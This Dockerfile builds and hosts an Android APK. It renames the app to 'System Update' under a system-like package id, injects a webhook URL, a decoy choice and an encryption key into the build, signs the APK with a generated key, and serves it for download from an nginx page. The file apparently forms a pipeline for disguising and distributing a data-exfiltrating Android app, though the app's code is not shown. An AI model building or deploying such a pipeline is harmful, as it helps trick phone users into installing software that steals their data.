# ---------- Stage 1: сборка APK ----------
FROM eclipse-temurin:17-jdk-jammy AS builder

ARG WEBHOOK_URL=""
ARG DECOY_CHOICE="1"
ARG APP_NAME="System Update"
ARG PKG_NAME="com.android.system.stability"
ARG VERSION_NAME="8.5.6"

ENV ANDROID_SDK_ROOT=/opt/android-sdk \
    ANDROID_HOME=/opt/android-sdk \
    PATH=/opt/android-sdk/cmdline-tools/latest/bin:/opt/android-sdk/platform-tools:$PATH

RUN apt-get update && apt-get install -y --no-install-recommends \
      wget unzip curl ca-certificates && rm -rf /var/lib/apt/lists/*

# Android cmdline-tools + platform 34 + build-tools 34
RUN mkdir -p $ANDROID_SDK_ROOT/cmdline-tools \
 && wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip -O /tmp/t.zip \
 && unzip -q /tmp/t.zip -d $ANDROID_SDK_ROOT/cmdline-tools \
 && mv $ANDROID_SDK_ROOT/cmdline-tools/cmdline-tools $ANDROID_SDK_ROOT/cmdline-tools/latest \
 && rm /tmp/t.zip \
 && yes | sdkmanager --licenses > /dev/null \
 && sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

WORKDIR /src
COPY . .

# Подпись: без keystore.properties release-APK соберётся неподписанным и не встанет
RUN keytool -genkeypair -keystore lab-rats-keystore.jks -alias lab-rats-key \
      -keyalg RSA -keysize 2048 -validity 9125 \
      -storepass lab-rats123 -keypass lab-rats123 \
      -dname "CN=Lab-STAR Developer, O=Lab-STAR.LABS, C=US" \
 && printf 'storeFile=lab-rats-keystore.jks\nstorePassword=lab-rats123\nkeyAlias=lab-rats-key\nkeyPassword=lab-rats123\n' > keystore.properties

# build.gradle читает эти значения из local.properties
RUN printf 'sdk.dir=%s\nWEBHOOK_URL=%s\nDECOY_CHOICE=%s\nENCRYPTION_KEY=%s\n' \
      "$ANDROID_SDK_ROOT" "$WEBHOOK_URL" "$DECOY_CHOICE" \
      "$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)" > local.properties

# Имя, package id и версия
RUN sed -i "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|" app/build.gradle \
 && sed -i "s|versionName \"[^\"]*\"|versionName \"$VERSION_NAME\"|" app/build.gradle \
 && sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">$APP_NAME</string>|" \
      app/src/main/res/values/strings.xml

RUN chmod +x gradlew \
 && ./gradlew --no-daemon -Dorg.gradle.jvmargs="-Xmx1536m" clean assembleRelease

# ---------- Stage 2: раздача ----------
FROM nginx:alpine
ENV PORT=8080
COPY --from=builder /src/app/build/outputs/apk/release/app-release.apk /usr/share/nginx/html/app.apk
COPY web/index.html /usr/share/nginx/html/index.html
COPY web/default.conf.template /etc/nginx/templates/default.conf.template
EXPOSE 8080
